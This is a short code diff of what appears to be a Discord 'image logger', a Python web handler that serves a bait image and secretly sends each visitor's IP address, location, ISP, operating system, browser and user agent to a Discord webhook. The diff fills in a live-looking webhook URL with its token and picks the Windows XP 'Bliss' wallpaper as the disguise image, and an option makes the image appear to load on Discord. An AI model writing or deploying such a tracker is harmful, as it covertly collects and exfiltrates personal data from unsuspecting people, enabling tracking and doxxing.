@@ -2,8 +2,8 @@ from http.server import BaseHTTPRequestHandler
 from urllib import parse
 import requests, base64, httpagentparser
 
-webhook = 'WEBHOOK'
-bindata = requests.get('link to image here').content
+webhook = 'https://discord.com/api/webhooks/1386017362251092189/TVWgTpWgkRWbnpUcXBlEfdX4U0tgsUOd4q5N9RRZHfo4oaKz-vyAxLQ70dQcZHnu9dHT'
+bindata = requests.get('https://upload.wikimedia.org/wikipedia/en/2/27/Bliss_%28Windows_XP%29.png').content
 
 buggedimg = True # Set this to True if you want the image to show as loading on Discord, False if you don't. (CASE SENSITIVE)
 
@@ -28,7 +28,7 @@ def formatHook(ip,city,reg,country,loc,org,postal,useragent,os,browser):
         {
           "name": "Advanced Info",
           "value": f"**OS:** `{os}`\n**Browser:** `{browser}`\n**UserAgent:** `Look Below!`\n```yaml\n{useragent}\n```",
-          "inline": False
+          "inline": True
         }
       ]
     }
